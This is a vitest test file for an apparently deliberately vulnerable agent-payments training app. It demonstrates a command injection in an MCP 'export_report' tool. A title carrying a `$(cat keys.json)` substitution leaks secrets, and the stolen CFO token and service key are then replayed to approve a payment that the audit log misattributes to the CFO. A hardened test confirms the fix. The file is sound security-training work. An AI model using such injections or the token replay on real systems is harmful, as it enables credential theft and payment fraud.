import fs from 'node:fs';
import path from 'node:path';
import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { StreamableHTTPClientTransport } from '@modelcontextprotocol/sdk/client/streamableHttp.js';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { bal, withStack, type TestStack } from './helpers';

let t: TestStack;
beforeEach(async () => { delete process.env.DVAP_HARDEN; t = await withStack(); });
afterEach(async () => { await t.teardown(); });

async function exportReport(title: string) {
  const c = new Client({ name: 'x', version: '0' });
  await c.connect(new StreamableHTTPClientTransport(new URL(t.urls.mcp), { requestInit: { headers: { Authorization: `Bearer ${t.keys.portalToken}` } } }));
  const r = await c.callTool({ name: 'export_report', arguments: { title } });
  await c.close();
  return { isError: Boolean(r.isError), text: (r.content as { text: string }[])[0]!.text };
}

describe('V10 — command injection in export_report (Pwn)', () => {
  const leak = () => `Q3 $(cat ${path.join(t.dir, 'keys.json')})`;

  it('default: the title runs in a shell and leaks every secret in keys.json', async () => {
    const r = await exportReport(leak());
    expect(r.text).toContain(t.keys.cfoToken);
    expect(r.text).toContain(t.keys.serviceKey);
  });

  it('default: the leaked CFO token + service key let the attacker approve their own payment, no CFO involved', async () => {
    const pay = await t.client.updatePolicy(t.keys.agentId, 'setup', { allowPayees: ['p_globex'], trustPayees: ['p_globex'], perTxCap: '20000000000' });
    expect(pay.allowedPayees).toContain('p_globex');
    const p = await t.client.createPayment({ agentId: t.keys.agentId, invoiceId: 'INV-2001', payeeId: 'p_globex', amount: '9500000000' });
    const loot = (await exportReport(leak())).text; // the attacker just greps the response for secrets
    const stolen = { serviceKey: /svc_[0-9a-f]+/.exec(loot)![0], cfoToken: /cfo_[0-9a-f]+/.exec(loot)![0] };
    const before = await bal(t, 'acct_globex');
    const attacker = new (t.client.constructor as new (u: string, k: string) => typeof t.client)(t.urls.ledger, stolen.serviceKey);
    await attacker.approvePayment(p.id, stolen.cfoToken);
    expect(await bal(t, 'acct_globex')).toBe(before + 9_500_000_000);
    expect((await t.client.audit()).entries.some((e) => e.actor === 'cfo' && e.action === 'payment.approved')).toBe(true); // audit says the CFO did it
  });

  it('hardened: the title is data — no expansion, nothing leaks, bad titles are rejected', async () => {
    process.env.DVAP_HARDEN = 'V10';
    const bad = await exportReport(leak());
    expect(bad.isError).toBe(true);
    expect(bad.text).not.toContain(t.keys.cfoToken);
    const ok = await exportReport('Q3 payables');
    expect(JSON.parse(ok.text).preview).toBe('Report: Q3 payables');
    expect(fs.readdirSync(path.join(t.dir, 'reports')).length).toBe(1);
  });
});
